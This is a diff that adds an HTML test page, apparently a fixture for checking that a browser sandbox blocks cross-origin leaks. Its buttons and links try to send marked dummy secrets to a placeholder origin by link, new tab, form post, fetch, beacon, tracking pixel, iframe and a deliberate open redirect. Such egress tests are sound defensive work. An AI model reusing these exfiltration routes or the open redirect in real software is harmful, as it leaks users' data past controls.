@@ -1,0 +1,70 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Gauntlet — escape</title>
+<link rel="stylesheet" href="/_g.css">
+<script src="/_g.js"></script>
+</head>
+<body>
+<!--
+  Every control here tries to make the browser talk to another origin, each
+  by a different route. This page never contacts that origin while loading,
+  so a sandbox that allowlists what the page loads has no reason to allow it.
+  The other origin's request log must stay empty.
+-->
+<h1>Escape hatches</h1>
+
+<p><a data-g="link" href="{{OTHER_ORIGIN}}/tabs/child?token=secret-in-link">Partner site</a></p>
+<p><a data-g="link-new-tab" href="{{OTHER_ORIGIN}}/tabs/child?token=secret-in-tab" target="_blank">Partner site (new tab)</a></p>
+
+<form method="post" action="{{OTHER_ORIGIN}}/api/login">
+  <input type="hidden" name="card" value="4242-secret-in-form">
+  <button data-g="form-post" type="submit">Pay with partner</button>
+</form>
+
+<p><button data-g="window-open" type="button">Open partner window</button></p>
+<p><button data-g="fetch" type="button">Send analytics</button></p>
+<p><button data-g="beacon" type="button">Send beacon</button></p>
+<p><button data-g="image" type="button">Load tracking pixel</button></p>
+<p><button data-g="redirect" type="button">Go through our own redirect</button></p>
+
+<iframe data-frame="escape" src="/frame/escape" title="Embedded widget" width="420" height="120"></iframe>
+
+<p><a data-g="same-origin-tab" href="/tabs/child?from=escape" target="_blank" rel="opener">Our own report (new tab)</a></p>
+<p id="result" role="status"></p>
+
+<script>
+  const G = window.__gauntlet;
+  const OTHER = '{{OTHER_ORIGIN}}';
+  const say = (text) => { document.getElementById('result').textContent = text; };
+
+  G.find('window-open').addEventListener('click', () => {
+    window.open(`${OTHER}/tabs/child?token=secret-in-window`, '_blank');
+    say('Window requested');
+  });
+  G.find('fetch').addEventListener('click', async () => {
+    try {
+      await fetch(`${OTHER}/api/poll?user=secret-in-fetch`, { mode: 'no-cors' });
+      say('Analytics sent');
+    } catch {
+      say('Analytics failed');
+    }
+  });
+  G.find('beacon').addEventListener('click', () => {
+    navigator.sendBeacon(`${OTHER}/api/poll?user=secret-in-beacon`, 'payload');
+    say('Beacon queued');
+  });
+  G.find('image').addEventListener('click', () => {
+    const img = new Image();
+    img.onerror = () => say('Pixel failed');
+    img.onload = () => say('Pixel loaded');
+    img.src = `${OTHER}/api/poll?user=secret-in-image`;
+  });
+  // An open redirect on the app's own origin.
+  G.find('redirect').addEventListener('click', () => {
+    location.href = `/redirect?to=${encodeURIComponent(`${OTHER}/tabs/child?token=secret-in-redirect`)}`;
+  });
+</script>
+</body>
+</html>
